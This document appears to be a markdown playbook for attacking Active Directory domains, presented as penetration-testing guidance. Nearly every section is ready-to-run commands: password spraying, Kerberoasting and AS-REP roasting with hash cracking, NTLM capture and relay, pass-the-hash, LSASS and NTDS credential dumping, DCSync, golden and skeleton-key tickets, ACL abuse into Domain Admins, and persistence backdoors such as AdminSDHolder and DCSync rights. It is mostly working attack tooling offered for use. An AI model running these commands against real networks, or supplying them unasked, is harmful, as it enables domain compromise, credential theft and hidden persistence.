# Active Directory Attack Playbook

> A practical, end-to-end playbook for Active Directory penetration testing — from initial foothold to domain dominance.

---

## Table of Contents

- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Initial Access Techniques](#initial-access-techniques)
- [Credential Attacks](#credential-attacks)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Domain Dominance](#domain-dominance)
- [Persistence](#persistence)
- [Key Tools Reference](#key-tools-reference)

---

## Reconnaissance & Enumeration

### Unauthenticated enumeration

```bash
# Enumerate SMB shares (null session)
smbclient -L //DC01 -N
crackmapexec smb 192.168.1.0/24 --shares -u '' -p ''

# LDAP anonymous bind
ldapsearch -x -H ldap://DC01 -b "DC=corp,DC=local"

# DNS enumeration
dig @DC01 corp.local ANY
nmap -p 53 --script=dns-zone-transfer DC01

# RPC null session
rpcclient -U "" -N DC01
  rpcclient> enumdomusers
  rpcclient> enumdomgroups
```

### Authenticated enumeration

```bash
# BloodHound collection (SharpHound)
./SharpHound.exe -c All --zipfilename bh.zip

# BloodHound.py (from Linux)
bloodhound-python -d corp.local -u user -p 'Password1' \
  -c All -ns DC01 --zip

# PowerView — key commands
Import-Module PowerView.ps1
Get-Domain
Get-DomainUser -Properties samaccountname,memberof,description
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Get-DomainComputer -Properties name,operatingsystem,dnshostname
Find-LocalAdminAccess    # slow but thorough
Get-NetGPO | select displayname, gpcfilesyspath

# CrackMapExec full enum
crackmapexec smb DC01 -u user -p 'Password1' --users --groups --shares --pass-pol
```

---

## Initial Access Techniques

### Password spraying

```bash
# Build user list with kerbrute
kerbrute userenum --dc DC01 -d corp.local /opt/users.txt

# Spray (1 password, avoids lockout)
kerbrute passwordspray -d corp.local --dc DC01 users.txt 'Spring2024!'

# CrackMapExec spray
crackmapexec smb DC01 -u users.txt -p 'Spring2024!' --continue-on-success
```

### AS-REP Roasting (no pre-auth accounts)

```bash
# From Linux (Impacket)
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC01 -format hashcat -outputfile asrep.txt

# From Windows (Rubeus)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack the hash
hashcat -m 18200 asrep.txt /opt/wordlists/rockyou.txt
```

---

## Credential Attacks

### Kerberoasting

```bash
# From Linux
GetUserSPNs.py corp.local/user:'Password1' -dc-ip DC01 \
  -request -outputfile kerberoast.txt

# From Windows (Rubeus)
Rubeus.exe kerberoast /outfile:kerb.txt /simple

# Crack
hashcat -m 13100 kerberoast.txt /opt/wordlists/rockyou.txt
```

### NTLM hash capture

```bash
# Responder — capture NTLMv2 hashes
sudo responder -I eth0 -rdwv

# Crack captured hash
hashcat -m 5600 ntlmv2.txt /opt/wordlists/rockyou.txt

# NTLM relay with ntlmrelayx
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c "whoami"
```

### Pass-the-Hash (PtH)

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Impacket wmiexec / psexec
wmiexec.py -hashes ':NTLMHASH' Administrator@TARGET
psexec.py -hashes ':NTLMHASH' Administrator@TARGET

# Evil-WinRM
evil-winrm -i TARGET -u Administrator -H 'NTLMHASH'
```

### Dumping credentials

```bash
# SAM / SYSTEM (local hashes)
# On Windows:
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# On Linux:
secretsdump.py -sam sam -system system LOCAL

# LSASS dump (Mimikatz)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LSASS dump (remote, CrackMapExec)
crackmapexec smb TARGET -u admin -p 'Password1' --lsa

# NTDS.dit dump (DCSync)
secretsdump.py corp.local/user:'Password1'@DC01 -just-dc-ntlm
```

---

## Lateral Movement

### WMI / WinRM

```bash
# WMI exec (Impacket)
wmiexec.py corp.local/user:'Password1'@TARGET

# WinRM (Evil-WinRM)
evil-winrm -i TARGET -u user -p 'Password1'

# PsExec (Impacket)
psexec.py corp.local/user:'Password1'@TARGET
```

### Pass-the-Ticket

```bash
# Export TGT with Rubeus
Rubeus.exe tgtdeleg /nowrap

# Import ticket on Linux
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass corp.local/user@TARGET
```

### Overpass-the-Hash

```bash
# Request TGT using NTLM hash (Rubeus)
Rubeus.exe asktgt /user:Administrator /rc4:NTLMHASH /ptt

# Or with Impacket
getTGT.py corp.local/Administrator -hashes ':NTLMHASH'
export KRB5CCNAME=Administrator.ccache
psexec.py -k corp.local/Administrator@TARGET
```

---

## Privilege Escalation

### ACL / ACE abuse

```bash
# Find abusable ACEs (BloodHound or PowerView)
# BloodHound: look for GenericAll, GenericWrite, WriteDACL, WriteOwner on high-value targets

# Add user to group (GenericAll on group)
Add-DomainGroupMember -Identity "Domain Admins" -Members user -Credential $cred

# Reset password (GenericAll on user)
Set-DomainUserPassword -Identity targetUser -AccountPassword (ConvertTo-SecureString 'NewPass1' -AsPlainText -Force)

# Targeted Kerberoasting (GenericWrite on user — set SPN then roast)
Set-DomainObject -Identity targetUser -SET @{serviceprincipalname='fake/spn'}
GetUserSPNs.py corp.local/user:'Password1' -dc-ip DC01 -request -outputfile targeted.txt
```

### LAPS abuse

```bash
# Find computers with LAPS
Get-DomainComputer -Filter {ms-mcs-AdmPwdExpirationTime=*} -Properties name,ms-mcs-admpwd

# Read LAPS password (if you have permission)
Get-AdmPwdPassword -ComputerName TARGET
crackmapexec ldap DC01 -u user -p 'Password1' --module laps
```

---

## Domain Dominance

### DCSync

```bash
# Requires: Domain Admin, Enterprise Admin, or Replication rights
secretsdump.py corp.local/Administrator:'Password1'@DC01 -just-dc

# Dump all NT hashes
secretsdump.py corp.local/Administrator:'Password1'@DC01 \
  -just-dc-ntlm -outputfile dc-hashes.txt
```

### Golden Ticket

```bash
# Requires: krbtgt NTLM hash + domain SID
# Get krbtgt hash from DCSync above
# Get domain SID: Get-DomainSID

# Create golden ticket (Mimikatz)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt" "exit"

# Create golden ticket (Impacket)
ticketer.py -nthash KRBHASH -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k corp.local/Administrator@DC01
```

### Silver Ticket

```bash
# Forge a service ticket without DC interaction
ticketer.py -nthash SERVICEHASH -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/TARGET.corp.local Administrator
```

### Skeleton Key

```bash
# Patch LSASS on DC — all accounts accept "mimikatz" as password
# (in-memory only, doesn't survive reboots)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

---

## Persistence

```bash
# Add backdoor admin (Impacket)
addcomputer.py corp.local/user:'Password1' -dc-ip DC01 -computer-name BACKDOOR$ -computer-pass 'Backdoor1!'

# Add DCSync rights to a user (WriteDACL on domain)
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity backdooruser \
  -Rights DCSync

# DSRM backdoor (persists through DC reboots)
# Set DSRM password to match a domain account hash

# AdminSDHolder backdoor (survives AdminSDHolder propagation)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
  -PrincipalIdentity backdooruser -Rights All
```

---

## Key Tools Reference

| Tool | Purpose | Location |
|------|---------|---------|
| BloodHound / SharpHound | AD graph analysis | github.com/BloodHoundAD |
| Impacket suite | Python AD attack toolkit | github.com/fortra/impacket |
| CrackMapExec | Swiss-army knife for AD | github.com/byt3bl33d3r/CrackMapExec |
| Rubeus | Kerberos manipulation | github.com/GhostPack/Rubeus |
| Mimikatz | Credential extraction | github.com/gentilkiwi/mimikatz |
| Kerbrute | User/password enumeration | github.com/ropnop/kerbrute |
| PowerView | PowerShell AD recon | github.com/PowerShellMafia/PowerSploit |
| Evil-WinRM | WinRM shell | github.com/Hackplayers/evil-winrm |

---

*Last updated: 2024-01-22 · Category: Active Directory*
